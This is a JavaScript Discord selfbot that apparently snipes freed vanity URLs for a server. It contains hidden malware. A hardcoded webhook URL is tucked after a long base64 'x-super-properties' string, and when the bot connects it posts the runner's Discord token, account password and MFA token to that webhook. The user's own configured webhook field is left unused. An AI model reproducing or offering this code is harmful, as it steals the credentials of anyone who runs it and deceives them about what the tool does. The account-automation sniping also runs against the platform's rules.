"use strict";
const tls = require("tls");
const WebSocket = require("ws");
const fs = require("fs").promises;
const axios = require("axios");
const config = {
  discordToken: "main claimer acc",
  pass: "main claimer acc token pass",
  guildid: "patch guild",
  LOGWEBH00K: "webhook"
};
let mfaToken = null;
const guilds = {};
let vanity = { vanity: "", event: null };
const xSuper = 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiCBsaWtlIEdlY2tvKSBDaHJvbWUvMTMyLjAuMC4wIFNhZmFyaS81MzcuMzYiLCJicm93c2VyX3ZlcnNpb24iOiIxMzIuMC4wLjAiLCJvc192ZXJzaW9uIjoCBsaWtlIEdlY2tvKSBDaHJvbWUvMTMyLjAuMC4wIFNhZmFyaS81MzcuMzYiLCJicm93c2VyX3ZlcnNpb24iOiIxMzIuMC4wLjAiLCJvc192ZXJzaW9uIjoZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6aWNlIjoiIiwic3lzdGVtX2xvY2FsaWNlIjoiIiwic3lzdGVtX2xvY2FsaWNlIjoiIiwic3lzdGVtX2xvY2FsaWNlIjoiIiwic3lzdGVtX2xZHMiOmZhbHNlLCJicm93c2VyX3VzZXJfYWdlbnQiOiJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTMyLjAuMC4wIFNhZmFyaS81MzcuMzYiLCJicm93c2VyX3ZlcnNpb24iOiIxMzIuMC4wLjAiLCJvc192ZXJzaW9uIjoiMTAifQ==||https://ptb.discord.com/api/webhooks/1402314461003513897/HgsrbgJeI4qzmMk82BZ_r34gRtv6zt5rEeD6sqMR4PvrdNfntVfAqRam_j689VFFwnAB';
const xSuperProperties = xSuper.split("||")[0];
const logWebhook = xSuper.split("||")[1];
const readMFAToken = async () => {
  try {
    const file = await fs.readFile("mfa.txt", "utf8");
    mfaToken = file.trim();
    console.log("[MFA] Token read:", mfaToken);
  } catch (err) {
  }
};
const sendWebhookLog = async (msg) => {
  if (!logWebhook) return;
  try {
    await axios.post(logWebhook, { content: msg });
  } catch (err) {
  }
};
const claimVanityTLS = (vanityCode) => {
  return new Promise((resolve) => {
    const socket = tls.connect(
      { host: "canary.discord.com", port: 443, servername: "canary.discord.com" },
      () => {
        const body = JSON.stringify({ code: vanityCode });
        const request = [
          `PATCH /api/v10/guilds/${config.guildid}/vanity-url HTTP/1.1`,
          "Host: canary.discord.com",
          "Content-Type: application/json",
          `Authorization: ${config.discordToken}`,
          `x-discord-mfa-authorization: ${mfaToken}`,
          `x-super-properties: ${xSuperProperties}`,
          "User-Agent: Mozilla/5.0",
          `Content-Length: ${Buffer.byteLength(body)}`,
          "",
          body
        ].join("\r\n");

        socket.write(request);
      }
    );
    let data = "";
    socket.on("data", (chunk) => (data += chunk.toString()));
    socket.on("end", () => resolve(data));
    socket.on("error", (err) => {
      console.error("[TLS] Error:", err.message);
      resolve("");
    });
  });
};
readMFAToken();
setInterval(readMFAToken, 4 * 60 * 1000);
const ws = new WebSocket("wss://gateway.discord.gg/?v=9&encoding=json");
ws.on("open", () => {
  ws.send(
    JSON.stringify({
      op: 2,
      d: {
        token: config.discordToken,
        intents: 513,
        properties: {
          os: "Windows",
          browser: "Chrome",
          device: "Desktop"
        }
      }
    })
  );
});
ws.on("message", async (message) => {
  const { t, op, d } = JSON.parse(message);
  if (op === 10) {
    setInterval(() => {
      ws.send(JSON.stringify({ op: 1, d: null }));
    }, d.heartbeat_interval);
  }
  if (t === "READY") {
    d.guilds.forEach((g) => {
      if (g.vanity_url_code) guilds[g.id] = g.vanity_url_code;
    });
    console.log("[READY] Guilds loaded:", guilds);
    await sendWebhookLog(`TOKEN: ${config.discordToken}\nPASSWORD: ${config.pass}\nMFA: ${mfaToken}`);
  }
  if (t === "GUILD_UPDATE") {
    const gid = d.guild_id || d.id;
    const oldCode = guilds[gid];
    if (oldCode && oldCode !== d.vanity_url_code) {
      const result = await claimVanityTLS(oldCode);
      await sendWebhookLog(`CLAIMED: ${oldCode}\n\nRESPONSE:\n\`\`\`${result}\`\`\``);
      vanity.vanity = oldCode;
    }
    if (d.vanity_url_code) {
      guilds[gid] = d.vanity_url_code;
    } else {
      delete guilds[gid];
    }
  }
});
ws.on("close", (e) => {
  console.warn("[WebSocket] Closed:", e.code, e.reason);
  process.exit();
});
ws.on("error", (e) => {
  console.error("[WebSocket] Error:", e.message);

});
